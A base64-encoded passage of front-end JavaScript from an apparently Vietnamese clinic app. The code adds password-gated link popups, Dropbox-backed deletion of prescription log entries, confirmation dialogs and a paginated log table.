QoNCiAgLy8gS2h1bmcgcG9wdXANCiAgY29uc3QgYm94ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYm94LnN0eWxlLCB7DQogICAgYmFja2dyb3VuZDogJyNmZmYnLCBwYWRkaW5nOiAnMjRweCcsIGJvcmRlclJhZGl1czogJzEwcHgnLA0KICAgIG1heFdpZHRoOiAnNDIwcHgnLCB3aWR0aDogJzkwJScsIGJveFNoYWRvdzogJzAgNHB4IDEwcHggcmdiYSgwLDAsMCwwLjMpJywNCiAgICBkaXNwbGF5OiAnZmxleCcsIGZsZXhEaXJlY3Rpb246ICdjb2x1bW4nLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywgZ2FwOiAnMTJweCcNCiAgfSk7DQoNCiAgLy8gVGnDqnUgxJHhu4Egbmfhuq9uIGfhu41uIChraMO0bmcgY8OzIGljb24vZ+G7rWkgZOG7ryBsaeG7h3UpDQogIGNvbnN0IHRpdGxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIHRpdGxlLnRleHRDb250ZW50ID0gJ05o4bqtcCBt4bqtdCBraOG6qXUgxJHhu4MgbeG7nyBsaW5rJzsNCiAgdGl0bGUuc3R5bGUuZm9udFdlaWdodCA9ICc2MDAnOw0KDQogIC8vIMOUIG5o4bqtcCBt4bqtdCBraOG6qXUNCiAgY29uc3QgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOw0KICBPYmplY3QuYXNzaWduKGlucHV0LCB7IHR5cGU6ICdwYXNzd29yZCcsIHBsYWNlaG9sZGVyOiAnTeG6rXQga2jhuql1JyB9KTsNCiAgT2JqZWN0LmFzc2lnbihpbnB1dC5zdHlsZSwgew0KICAgIHBhZGRpbmc6ICcxMHB4Jywgd2lkdGg6ICcxMDAlJywgYm9yZGVyOiAnMXB4IHNvbGlkICNkZGQnLCBib3JkZXJSYWRpdXM6ICc2cHgnDQogIH0pOw0KDQogIC8vIFRow7RuZyBiw6FvIGzhu5dpICjhuqluIG3hurdjIMSR4buLbmgpDQogIGNvbnN0IGVyciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICBlcnIudGV4dENvbnRlbnQgPSAn4p2MIFNhaSBt4bqtdCBraOG6qXUhJzsNCiAgT2JqZWN0LmFzc2lnbihlcnIuc3R5bGUsIHsgY29sb3I6ICdyZWQnLCBmb250U2l6ZTogJzE0cHgnLCBkaXNwbGF5OiAnbm9uZScgfSk7DQoNCiAgLy8gTsO6dCB4w6FjIG5o4bqtbg0KICBjb25zdCBidG4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdidXR0b24nKTsNCiAgYnRuLnRleHRDb250ZW50ID0gJ1jDoWMgbmjhuq1uJzsNCiAgT2JqZWN0LmFzc2lnbihidG4uc3R5bGUsIHsNCiAgICBwYWRkaW5nOiAnMTBweCAxNnB4JywgYmFja2dyb3VuZDogJyMzNDk4ZGInLCBjb2xvcjogJyNmZmYnLA0KICAgIGJvcmRlcjogJ25vbmUnLCBib3JkZXJSYWRpdXM6ICc2cHgnLCBjdXJzb3I6ICdwb2ludGVyJw0KICB9KTsNCg0KICAvLyBQcm9ncmVzcyBiYXIgKMSR4bq3dCBExq/hu5pJIEPDmU5HKQ0KICBjb25zdCBiYXJXcmFwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYmFyV3JhcC5zdHlsZSwgew0KICAgIHdpZHRoOiAnMTAwJScsIGJhY2tncm91bmQ6ICcjZGRkJywgaGVpZ2h0OiAnNnB4JywNCiAgICBib3JkZXJSYWRpdXM6ICczcHgnLCBtYXJnaW5Ub3A6ICcxMnB4Jw0KICB9KTsNCiAgY29uc3QgYmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIE9iamVjdC5hc3NpZ24oYmFyLnN0eWxlLCB7IHdpZHRoOiAnMCUnLCBoZWlnaHQ6ICcxMDAlJywgYmFja2dyb3VuZDogJyMzNDk4ZGInIH0pOw0KICBiYXJXcmFwLmFwcGVuZENoaWxkKGJhcik7DQoNCiAgLy8gR+G6r24gdsOgbyBET00NCiAgYm94LmFwcGVuZENoaWxkKHRpdGxlKTsNCiAgYm94LmFwcGVuZENoaWxkKGlucHV0KTsNCiAgYm94LmFwcGVuZENoaWxkKGVycik7DQogIGJveC5hcHBlbmRDaGlsZChidG4pOw0KICBib3guYXBwZW5kQ2hpbGQoYmFyV3JhcCk7DQogIG92ZXJsYXkuYXBwZW5kQ2hpbGQoYm94KTsNCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCg0KICAvLyBDaOG6t24gY2xpY2sgYsOqbiB0cm9uZyBraMO0bmcgxJHDs25nDQogIGJveC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogIC8vIENsaWNrIHJhIG5nb8OgaSDEkeG7gyB04bqvdA0KICBvdmVybGF5LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogIH0pOw0KDQogIC8vIFjhu60gbMO9IHjDoWMgbmjhuq1uDQogIGFzeW5jIGZ1bmN0aW9uIHN1Ym1pdCgpIHsNCiAgICAvLyDEkOG7lWkgbeG6rXQga2jhuql1IOG7nyDEkcOieQ0KICAgIGNvbnN0IE9LID0gaW5wdXQudmFsdWUgPT09ICcxISc7DQoNCiAgICBpZiAoIU9LKSB7DQogICAgICBlcnIuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICByZXR1cm47DQogICAgfQ0KICAgIGVyci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGJ0bi5kaXNhYmxlZCA9IHRydWU7DQogICAgaW5wdXQuZGlzYWJsZWQgPSB0cnVlOw0KDQogICAgLy8gQW5pbWF0ZSBwcm9ncmVzcyBuaGFuaCBsw6puIDEwMCUNCiAgICBiYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjZzIGVhc2UnOw0KICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiAoYmFyLnN0eWxlLndpZHRoID0gJzEwMCUnKSk7DQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICB3aW5kb3cub3Blbih1cmwsICdfYmxhbmsnKTsNCiAgICAgIGlmIChvdmVybGF5LnBhcmVudE5vZGUpIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7DQogICAgfSwgNjUwKTsNCiAgfQ0KDQogIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIHN1Ym1pdCk7DQogIGlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCAoZSkgPT4gew0KICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgc3VibWl0KCk7DQogIH0pOw0KDQogIC8vIEZvY3VzIG5nYXkgw7QgbeG6rXQga2jhuql1DQogIHNldFRpbWVvdXQoKCkgPT4gaW5wdXQuZm9jdXMoKSwgMCk7DQp9DQoNCmZ1bmN0aW9uIGV4dHJhY3RGaWxlbmFtZShkcm9wYm94UHJldmlld1VybCkgew0KICB0cnkgew0KICAgIGNvbnN0IHUgPSBuZXcgVVJMKGRyb3Bib3hQcmV2aWV3VXJsKTsNCiAgICBjb25zdCBwID0gdS5zZWFyY2hQYXJhbXMuZ2V0KCdwcmV2aWV3Jyk7DQogICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwIHx8ICcnKTsNCiAgfSBjYXRjaCB7IHJldHVybiAnJzsgfQ0KfQ0KDQovLyBI4buZcCB4w6FjIG5o4bqtbiB4b8OhICh0cuG6oyB24buBIFByb21pc2U8Ym9vbGVhbj4pDQpmdW5jdGlvbiBjb25maXJtRGVsZXRlUG9wdXAodGV4dD0nQuG6oW4gY8OzIGNo4bqvYyBtdeG7kW4geG/DoT8nLCBvbmVCdXR0b249ZmFsc2UpIHsNCiAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4gew0KICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICBPYmplY3QuYXNzaWduKG92ZXJsYXkuc3R5bGUsIHsNCiAgICAgIHBvc2l0aW9uOidmaXhlZCcsIGluc2V0OicwJywgYmFja2dyb3VuZDoncmdiYSgwLDAsMCwwLjUpJywNCiAgICAgIGRpc3BsYXk6J2ZsZXgnLCBhbGlnbkl0ZW1zOidjZW50ZXInLCBqdXN0aWZ5Q29udGVudDonY2VudGVyJywgekluZGV4OjEwMDAxDQogICAgfSk7DQoNCiAgICBjb25zdCBib3ggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICBPYmplY3QuYXNzaWduKGJveC5zdHlsZSwgew0KICAgICAgYmFja2dyb3VuZDonI2ZmZicsIHBhZGRpbmc6JzIwcHgnLCBib3JkZXJSYWRpdXM6JzhweCcsDQogICAgICBtYXhXaWR0aDonNDIwcHgnLCB3aWR0aDonOTAlJywgYm94U2hhZG93OicwIDRweCAxMnB4IHJnYmEoMCwwLDAsLjI1KScsDQogICAgICBmb250RmFtaWx5OidJbnRlciwgc2Fucy1zZXJpZicNCiAgICB9KTsNCg0KICAgIGJveC5pbm5lckhUTUwgPSBgDQogICAgICA8ZGl2IHN0eWxlPSJmb250LXdlaWdodDo2MDA7IG1hcmdpbi1ib3R0b206OHB4Ij5Yw6FjIG5o4bqtbiB4b8OhPC9kaXY+DQogICAgICA8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOjE0cHgiPiR7dGV4dH08L2Rpdj4NCiAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDsgZ2FwOjEwcHg7IGp1c3RpZnktY29udGVudDpmbGV4LWVuZCI+DQogICAgICAgIDxidXR0b24gaWQ9ImRsZ0NhbmNlbCIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6IzdmOGM4ZCI+SHXhu7c8L2J1dHRvbj4NCiAgICAgICAgJHshb25lQnV0dG9uID8gYDxidXR0b24gaWQ9ImRsZ1llcyIgY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2U3NGMzYyI+WG/DoTwvYnV0dG9uPmAgOiAnJ30NCiAgICAgIDwvZGl2Pg0KICAgIGA7DQoNCiAgICBvdmVybGF5LmFwcGVuZENoaWxkKGJveCk7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsNCg0KICAgIGJveC5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogICAgb3ZlcmxheS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChvdmVybGF5KTsgcmVzb2x2ZShmYWxzZSk7IH0pOw0KICAgIGJveC5xdWVyeVNlbGVjdG9yKCcjZGxnQ2FuY2VsJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7IGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQob3ZlcmxheSk7IHJlc29sdmUoZmFsc2UpOyB9KTsNCg0KICAgIGlmICghb25lQnV0dG9uKSB7DQogICAgICBib3gucXVlcnlTZWxlY3RvcignI2RsZ1llcycpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4geyBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKG92ZXJsYXkpOyByZXNvbHZlKHRydWUpOyB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQovLyBYb8OhIDEgZW50cnkgbG9nICsgZmlsZSBFeGNlbCB0csOqbiBEcm9wYm94ICh0aGVvIGluZGV4IHRyb25nIG3huqNuZyBsb2dzKQ0KYXN5bmMgZnVuY3Rpb24gZGVsZXRlTG9nQW5kRmlsZV9CeUluZGV4KGlkeCkgew0KICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCiAgY29uc3QgbG9nUGF0aCA9ICcvdGh1dGh1YXQvbG9nLmpzb24nOw0KDQogIC8vIDEpIFThuqNpIGxvZy5qc29uIGhp4buHbiB04bqhaQ0KICBsZXQgbG9ncyA9IFtdOw0KICB0cnkgew0KICAgIGNvbnN0IGRsID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgIGNvbnN0IHRleHQgPSBhd2FpdCBkbC5yZXN1bHQuZmlsZUJsb2IudGV4dCgpOw0KICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQgfHwgJ1tdJyk7DQogIH0gY2F0Y2ggKGUpIHsNCiAgICBhbGVydCgnS2jDtG5nIMSR4buNYyDEkcaw4bujYyBsb2cuanNvbiB0csOqbiBEcm9wYm94LicpOyANCiAgICB0aHJvdyBlOw0KICB9DQoNCiAgY29uc3QgaXRlbSA9IGxvZ3NbaWR4XTsNCiAgaWYgKCFpdGVtKSB7IGFsZXJ0KCdLaMO0bmcgdMOsbSB0aOG6pXkgbeG7pWMgY+G6p24geG/DoS4nKTsgcmV0dXJuOyB9DQoNCiAgLy8gMikgTOG6pXkgZmlsZU5hbWUgJiB4b8OhIGZpbGUgRXhjZWwgKG7hur91IGPDsykNCiAgY29uc3QgZmlsZU5hbWUgPSBleHRyYWN0RmlsZW5hbWUoaXRlbS5saW5rIHx8ICcnKTsNCiAgY29uc3QgZmlsZVBhdGggPSBmaWxlTmFtZSA/IGAvdGh1dGh1YXQvJHtmaWxlTmFtZX1gIDogbnVsbDsNCg0KICB0cnkgew0KICAgIGlmIChmaWxlUGF0aCkgeyBhd2FpdCBkYnguZmlsZXNEZWxldGVWMih7IHBhdGg6IGZpbGVQYXRoIH0pOyB9DQogIH0gY2F0Y2ggKGUpIHsNCiAgICAvLyBO4bq/dSBmaWxlIGtow7RuZyB04buTbiB04bqhaSB24bqrbiB0aeG6v3AgdOG7pWMgeG/DoSBsb2cNCiAgICBjb25zb2xlLndhcm4oJ1hvw6EgZmlsZSBFeGNlbCBs4buXaS9raMO0bmcgdOG7k24gdOG6oWksIHRp4bq/cCB04bulYyB4b8OhIGxvZy4uLicsIGUpOw0KICB9DQoNCiAgLy8gMykgQ+G6rXAgbmjhuq10IGxvZzogYuG7jyBwaOG6p24gdOG7rSBpZHggdsOgIGdoaSDEkcOoIGzhuqFpDQogIGxvZ3Muc3BsaWNlKGlkeCwgMSk7DQogIGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgcGF0aDogbG9nUGF0aCwNCiAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgbW9kZTogeyAnLnRhZyc6ICdvdmVyd3JpdGUnIH0sDQogICAgYXV0b3JlbmFtZTogZmFsc2UNCiAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gb25EZWxldGVMb2dSb3coaW5kZXhJbkxvZ3MsIGN1cnJlbnRVc2VyKSB7DQogIC8vIE7hur91IGtow7RuZyBwaOG6o2kgZG9jdG9yIOKGkiBwb3B1cCBj4bqlbSB4b8OhLCBjaOG7iSBjw7MgMSBuw7p0IEh14bu3DQogIGlmIChjdXJyZW50VXNlciAhPT0gJ2RvY3RvcicpIHsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoDQogICAgICAn4p2MIMOKIGzDoG0gY8OhaSBnw6wgxJHhuqV5eXl5IGVtIMahaS4gPGJyLz5E4burbmcgbOG6oWkgbmdheSwgcXXDoSBuZ3V5IGhp4buDbS4nLA0KICAgICAgdHJ1ZSAvLyA8LS0gY2jhur8gxJHhu5kgMSBuw7p0DQogICAgKTsNCiAgICByZXR1cm47DQogIH0NCg0KICAvLyBO4bq/dSBsw6AgZG9jdG9yIOKGkiBwb3B1cCB4w6FjIG5o4bqtbiB4b8OhICgyIG7DunQpDQogIGNvbnN0IG9rID0gYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKA0KICAgICdC4bqhbiBjw7MgY2jhuq9jIG114buRbiB4b8OhIG3hu6VjIG7DoHk/JywNCiAgICBmYWxzZQ0KICApOw0KICBpZiAoIW9rKSByZXR1cm47DQoNCiAgdHJ5IHsNCiAgICBhd2FpdCBkZWxldGVMb2dBbmRGaWxlX0J5SW5kZXgoaW5kZXhJbkxvZ3MpOw0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgn4pyFIMSQw6MgeG/DoSB0aMOgbmggY8O0bmchJywgdHJ1ZSk7DQogICAgYXdhaXQgc2hvd0Ryb3Bib3hQYW5lbCgpOw0KICB9IGNhdGNoIChlKSB7DQogICAgY29uc29sZS5lcnJvcihlKTsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoJ+KaoO+4jyBDw7MgbOG7l2kga2hpIHhvw6EuIFZ1aSBsw7JuZyB0aOG7rSBs4bqhaS4nLCB0cnVlKTsNCiAgfQ0KfQ0KDQovLyDEkMOzbmcgcGFuZWwga2hpIGLhuqVtIEVTQyBob+G6t2MgY2xpY2sgcmEgbmdvw6BpDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZSkgew0KICBpZiAoZS5rZXkgPT09ICJFc2NhcGUiKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRyb3Bib3hQYW5lbCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogIH0NCn0pOw0KDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGUpIHsNCiAgY29uc3QgcGFuZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHJvcGJveFBhbmVsIik7DQogIGlmIChwYW5lbC5zdHlsZS5kaXNwbGF5ID09PSAiYmxvY2siIHx8IHBhbmVsLnN0eWxlLmRpc3BsYXkgPT09ICJmbGV4Iikgew0KICAgIGNvbnN0IGNvbnRlbnQgPSBwYW5lbC5xdWVyeVNlbGVjdG9yKCJkaXYiKTsNCiAgICAvLyBO4bq/dSBjbGljayBuZ2/DoGkgdsO5bmcgbuG7mWkgZHVuZyBwYW5lbA0KICAgIGlmICghY29udGVudC5jb250YWlucyhlLnRhcmdldCkpIHsNCiAgICAgIHBhbmVsLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KLy8gPT09PT09IFBIw4JOIFRSQU5HIELhuqJORyBMT0cgVFJPTkcgUE9QVVAgPT09PT09DQpsZXQgREJfTE9HUyA9IFtdOyAgICAgICAvLyB0b8OgbiBi4buZIGxvZ3MgxJHDoyB04bqjaQ0KbGV0IERCX1BBR0UgPSAxOyAgICAgICAgLy8gdHJhbmcgaGnhu4duIHThuqFpDQpsZXQgREJfUEFHRV9TSVpFID0gMTA7ICAvLyBz4buRIGTDsm5nIC8gdHJhbmcNCmxldCBEQl9DVVJSRU5UX1VTRVIgPSAnJzsgLy8gdXNlciDEkWFuZyDEkcSDbmcgbmjhuq1wIChsb3dlcmNhc2UpIMSR4buDIHJlbmRlciBuw7p0IFhvw6ENCg0KZnVuY3Rpb24gc2V0UGFnZVNpemUoc2l6ZSl7DQogIERCX1BBR0VfU0laRSA9IE51bWJlcihzaXplKSB8fCAxMDsNCiAgREJfUEFHRSA9IDE7DQogIHJlbmRlckRyb3Bib3hQYWdlKCk7DQp9DQoNCmZ1bmN0aW9uIGdvVG9QYWdlKHApew0KICBjb25zdCBtYXggPSBNYXRoLm1heCgxLCBNYXRoLmNlaWwoREJfTE9HUy5sZW5ndGggLyBEQl9QQUdFX1NJWkUpKTsNCiAgREJfUEFHRSA9IE1hdGgubWluKE1hdGgubWF4KDEsIHApLCBtYXgpOw0KICByZW5kZXJEcm9wYm94UGFnZSgpOw0KfQ0KDQpmdW5jdGlvbiByZW5kZXJEcm9wYm94UGFnZSgpew0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94RmlsZUxpc3QnKTsNCiAgY29uc3QgcGFnZUJ0bnMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VCdXR0b25zJyk7DQogIGNvbnN0IHBhZ2VJbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlSW5mbycpOw0KDQogIGlmKCF0Ym9keSkgcmV0dXJuOw0KDQogIC8vIHLhu5duZz8NCiAgaWYoIUFycmF5LmlzQXJyYXkoREJfTE9HUykgfHwgREJfTE9HUy5sZW5ndGggPT09IDApew0KICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjpyZWQiPktow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHU8L3RkPjwvdHI+YDsNCiAgICBpZihwYWdlQnRucykgcGFnZUJ0bnMuaW5uZXJIVE1MID0gJyc7DQogICAgaWYocGFnZUluZm8pIHBhZ2VJbmZvLnRleHRDb250ZW50ID0gJyc7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgY29uc3QgdG90YWwgPSBEQl9MT0dTLmxlbmd0aDsNCiAgY29uc3QgbWF4UGFnZSA9IE1hdGgubWF4KDEsIE1hdGguY2VpbCh0b3RhbCAvIERCX1BBR0VfU0laRSkpOw0KICBpZihEQl9QQUdFID4gbWF4UGFnZSkgREJfUEFHRSA9IG1heFBhZ2U7DQoNCiAgY29uc3Qgc3RhcnRJZHggPSAoREJfUEFHRSAtIDEpICogREJfUEFHRV9TSVpFOw0KICBjb25zdCBlbmRJZHggICA9IE1hdGgubWluKHN0YXJ0SWR4ICsgREJfUEFHRV9TSVpFLCB0b3RhbCk7DQogIGNvbnN0IHNsaWNlICAgID0gREJfTE9HUy5zbGljZShzdGFydElkeCwgZW5kSWR4KTsNCg0KICAvLyBSZW5kZXIgYm9keSB0aGVvIHRyYW5nDQogIHRib2R5LmlubmVySFRNTCA9IHNsaWNlLm1hcCgoaXRlbSwgaSkgPT4gYA0KICAgIDx0cj4NCiAgICAgIDx0ZD4ke3N0YXJ0SWR4ICsgaSArIDF9PC90ZD4NCiAgICAgIDx0ZD4ke2l0ZW0ua2hvYSB8fCAnJ308L3RkPg0KICAgICAgPHRkPiR7KGl0ZW0ubmdheSB8fCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJzAwOjAwOjAwJywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJzIzOjU5OjU5JywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJ1Thu6snLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnxJHhur9uJywnIC0+ICcpDQogICAgICAgICAgIC5yZXBsYWNlKC9ccysvZywnICcpDQogICAgICAgICAgIC50cmltKCl9PC90ZD4NCgkJICAgDQoJCSAgIDx0ZD4ke051bWJlcihpdGVtLmhlcmJfZXJyb3JzIHx8IDApfTwvdGQ+DQogICAgIDx0ZD4ke051bWJlcihpdGVtLnRpbWVfZXJyb3JzIHx8IDApfTwvdGQ+DQogICAgPHRkPiR7TnVtYmVyKGl0ZW0uY29uZmxpY3RfZXJyb3JzIHx8IDApfTwvdGQ+DQoJCSAgIA0KICAgICAgPHRkPiR7KGl0ZW0udGltZSB8fCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJywnLCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJyAnLCAnIC0gJykNCiAgICAgICAgICAgLnJlcGxhY2UoL1xzKy9nLCAnICcpDQogICAgICAgICAgIC50cmltKCl9PC90ZD4NCiAgICAgIDx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIG9uY2xpY2s9InZlcmlmeUFuZE9wZW5MaW5rKCcke2l0ZW0ubGlua30nKSI+WGVtPC9hPjwvdGQ+DQogICAgICA8dGQ+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2U3NGMzYzsgcGFkZGluZzoxMHB4IDE0cHg7IGZvbnQtc2l6ZToxMnB4OyINCiAgICAgICAgICBvbmNsaWNrPSJvbkRlbGV0ZUxvZ1Jvdygke3N0YXJ0SWR4ICsgaX0sICcke0RCX0NVUlJFTlRfVVNFUn0nKSI+DQogICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLXRyYXNoIj48L2k+IFhvw6ENCiAgICAgICAgPC9idXR0b24+DQogICAgICA8L3RkPg0KICAgIDwvdHI+DQogIGApLmpvaW4oJycpOw0KDQogIC8vIFJlbmRlciBuw7p0IHRyYW5nIChQcmV2IOKApiBOZXh0KSDigJQgaGnhu4NuIHRo4buLIGThuqNpIHThu5FpIMSRYSA3IG7DunQgc+G7kQ0KICBpZihwYWdlQnRucyl7DQogICAgY29uc3QgYnRuID0gKGxhYmVsLCB0YXJnZXQsIGRpc2FibGVkPWZhbHNlLCB0aXRsZT0nJykgPT4NCiAgICAgIGA8YnV0dG9uIGNsYXNzPSJidG4iICR7ZGlzYWJsZWQ/J2Rpc2FibGVkJzonJ30gdGl0bGU9IiR7dGl0bGV9Ig0KICAgICAgICAgICAgICAgc3R5bGU9InBhZGRpbmc6NnB4IDEwcHgke2Rpc2FibGVkPyc7b3BhY2l0eTouNjtjdXJzb3I6bm90LWFsbG93ZWQnOicnfSINCiAgICAgICAgICAgICAgIG9uY2xpY2s9ImdvVG9QYWdlKCR7dGFyZ2V0fSkiPiR7bGFiZWx9PC9idXR0b24+YDsNCg0KICAgIGNvbnN0IHJhbmdlID0gMzsgLy8gaGFpIGLDqm4gdHJhbmcgaGnhu4duIHThuqFpDQogICAgY29uc3QgZnJvbSAgPSBNYXRoLm1heCgxLCBEQl9QQUdFIC0gcmFuZ2UpOw0KICAgIGNvbnN0IHRvICAgID0gTWF0aC5taW4obWF4UGFnZSwgREJfUEFHRSArIHJhbmdlKTsNCg0KICAgIGxldCBodG1sID0gJyc7DQogICAgaHRtbCArPSBidG4oJ8KrIMSQ4bqndScsIDEsIERCX1BBR0U9PT0xLCAnVHJhbmcgxJHhuqd1Jyk7DQogICAgaHRtbCArPSBidG4oJ+KAuSBUcsaw4bubYycsIERCX1BBR0UtMSwgREJfUEFHRT09PTEsICdUcmFuZyB0csaw4bubYycpOw0KICAgIGZvcihsZXQgcCA9IGZyb207IHAgPD0gdG87IHArKyl7DQogICAgICBodG1sICs9IGA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImdvVG9QYWdlKCR7cH0pIg0KICAgICAgICAgICAgICAgICBzdHlsZT0icGFkZGluZzo2cHggMTBweDske3A9PT1EQl9QQUdFPydiYWNrZ3JvdW5kOiMyZWNjNzEnOicnfSI+DQogICAgICAgICAgICAgICAgICR7cH0NCiAgICAgICAgICAgICAgIDwvYnV0dG9uPmA7DQogICAgfQ0KICAgIGh0bWwgKz0gYnRuKCdTYXUg4oC6JywgREJfUEFHRSsxLCBEQl9QQUdFPT09bWF4UGFnZSwgJ1RyYW5nIHNhdScpOw0KICAgIGh0bWwgKz0gYnRuKCdDdeG7kWkgwrsnLCBtYXhQYWdlLCBEQl9QQUdFPT09bWF4UGFnZSwgJ1RyYW5nIGN14buRaScpOw0KDQogICAgcGFnZUJ0bnMuaW5uZXJIVE1MID0gaHRtbDsNCiAgfQ0KDQogIGlmKHBhZ2VJbmZvKXsNCiAgICBwYWdlSW5mby50ZXh0Q29udGVudCA9IGBUcmFuZyAke0RCX1BBR0V9LyR7bWF4UGFnZX0g4oCiICR7c3RhcnRJZHgrMX0tJHtlbmRJZHh9LyR7dG90YWx9YDsNCiAgfQ0KfQ0KDQovLyBH4bqvbiBz4buxIGtp4buHbiDEkeG7lWkgcGFnZSBzaXplIChjaOG7iSBj4bqnbiBn4buNaSAxIGzhuqduIHNhdSBraGkgcG9wdXAgbeG7nykNCmZ1bmN0aW9uIGF0dGFjaFBhZ2VyRXZlbnRzT25jZSgpew0KICBjb25zdCBzZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VTaXplJyk7DQogIGlmKHNlbCAmJiAhc2VsLmRhdGFzZXQuYm91bmQpew0KICAgIHNlbC5kYXRhc2V0LmJvdW5kID0gJzEnOw0KICAgIHNlbC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBlID0+IHNldFBhZ2VTaXplKGUudGFyZ2V0LnZhbHVlKSk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KDQoNCjwhLS0gUE9QVVAgVMOTTSBU4bquVCBM4buWSSAtLT4NCjxkaXYgaWQ9InN1bW1hcnlNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwNTAiPg0KICA8ZGl2IGlkPSJzdW1tYXJ5QmFja2Ryb3AiIHN0eWxlP